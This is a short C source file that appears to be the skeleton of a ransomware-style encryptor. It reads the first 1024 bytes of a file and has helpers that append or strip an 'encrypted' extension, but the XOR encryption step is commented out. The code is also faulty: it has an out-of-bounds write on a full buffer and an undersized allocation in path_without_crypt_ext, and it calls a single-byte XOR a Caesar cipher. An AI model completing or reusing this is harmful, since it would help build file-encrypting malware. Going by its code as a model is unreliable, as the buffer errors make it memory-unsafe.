#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "includes.h"

#define ENCRYPT_FIRST_BYTES 1024

char *path_with_crypt_ext(char *path);
char *path_without_crypt_ext(char *path);
void crypt(unsigned char *text, unsigned int length, int key);
void decrypt(unsigned char *text, unsigned int length, int key);




void encrypt_file(char *path) {
    FILE *file;
    unsigned int bytes;
    unsigned char buffer[ENCRYPT_FIRST_BYTES];

    if ((file = fopen(path, "rb")) == NULL ) {
        return;
    }

    bytes = fread(buffer, sizeof(unsigned char), ENCRYPT_FIRST_BYTES, file);
    buffer[bytes] = '\0';

    fclose(file);

    /*
    int key;
    key = 16;
    crypt(buffer, bytes, key);
    decrypt(buffer, bytes, key);
    */
}



/**
 * Adds path to the file extension that indicates that the file is encrypted
 */
char *path_with_crypt_ext(char *path) {
    int length = strlen(path) + strlen(CRYPT_EXT) + 1;
    char *new = malloc(length);

    if (new != NULL) {
        new[strlen(path)] = '\0';
        memcpy(new, path, strlen(path));
        strcat(new, CRYPT_EXT);

        return new;
    }
    else {
        return NULL;
    }
}



/**
 * Remove part of a file path that indicates that the file is encrypted
 */
char *path_without_crypt_ext(char *path) {
    int length = strlen(path) - strlen(CRYPT_EXT);
    char *new = malloc(length);

    if (new != NULL) {
        new[length] = '\0';
        memcpy(new, path, length);

        return new;
    }
    else {
        return NULL;
    }
}



/*****************************************************************************/
/* Text Encryption (Cipher Caesar) */
void crypt(unsigned char *text, unsigned int length, int key) {
    unsigned int i;
    for (i = 0; i < length; ++i) {
        *(text+i) = *(text+i) ^ key;
    }
}



/* Text Decryption (Cipher Caesar) */
void decrypt(unsigned char *text, unsigned int length, int key) {
    crypt(text, length, key);
}